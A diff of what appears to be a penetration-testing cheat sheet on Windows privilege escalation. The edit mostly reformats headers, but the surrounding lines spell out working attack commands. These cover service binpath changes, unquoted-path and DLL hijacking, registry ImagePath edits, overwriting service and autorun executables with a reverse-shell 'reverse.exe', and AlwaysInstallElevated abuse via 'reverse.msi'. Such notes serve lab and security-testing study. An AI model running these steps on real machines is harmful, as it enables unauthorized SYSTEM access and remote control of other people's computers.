@@ -734,9 +734,10 @@ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 .\winPEASany.exe quiet servicesinfo
 
 
-#####################################
-# 1. Insecure Service Properties ####
-#####################################
+
+#########################################################################
+#### 1. Insecure Service Properties #####################################
+#########################################################################
 
 # Verify permissions of a service using accesschk
 .\accesschk.exe /accepteula -uwcqv user {SERVICE}
@@ -753,9 +754,10 @@ config {SERVICE} binpath= "\"C:\{PAYLOAD PATH}\""
 # Start a service:
 net start {SERVICE}
 
-###############################
-# 2. Unquoted Service Path ####
-###############################
+
+#########################################################################
+##### 2. Unquoted Service Path ##########################################
+#########################################################################
 
 # Verify permissions of to start service using accesschk
 .\accesschk.exe /accepteula -uwcqv user {SERVICE}
@@ -770,9 +772,10 @@ copy reverse.exe {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\Commo
 net start {SERVICE}
 
 
-###################################
-# 3. Weak Registry Permissions ####
-###################################
+
+#########################################################################
+#### 3. Weak Registry Permissions #######################################
+#########################################################################
 
 # Check regsvc for weak entries using powershell
 powershell -exec bypass
@@ -794,9 +797,10 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 # Start the service:
 net start regsvc
 
-###################################################################
-# 4. Insecure Service Executables (File Permissions: Everyone) ####
-###################################################################
+
+#########################################################################
+##### 4. Insecure Service Executables (File Permissions: Everyone) ######
+#########################################################################
 
 # Verify permissions of a service using accesschk
 .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
@@ -810,9 +814,9 @@ copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepe
 # Start the service
 net start filepermsvc
 
-#######################
-# 5. DLL Hijacking ####
-#######################
+#########################################################################
+#### 5. DLL Hijacking ###################################################
+#########################################################################
 
 # Verify permissions of to start service using accesschk
 .\accesschk.exe /accepteula -uvqc dllsvc
@@ -841,17 +845,19 @@ net stop dllsvc
 net start dllsvc
 ```
 
-</br>
+<br />
 
 #### Registry Exploits
 
-```bash
+```ps1
 
-# 1. AutoRuns
+#########################################################################
+#### 1. AutoRuns ########################################################
+#########################################################################
 
 # Requires computer restart for priv esc.
 
-# Enumeration Commands
+# Winpeas Enumeration
 .\winPEASany.exe quiet applicationsinfo
 
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -863,11 +869,12 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
 
 
+#########################################################################
+#### 2. AlwaysInstallElevated ###########################################
+#########################################################################
 
-# 2. AlwaysInstallElevated
 
-
-# Enumeration  to see if both registry values are set
+# Winpeas Enumeration to see if both registry values are set
 .\winPEASany.exe quiet windowscreds
 
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -881,7 +888,6 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
 <br />
-
 
 
 ```bash
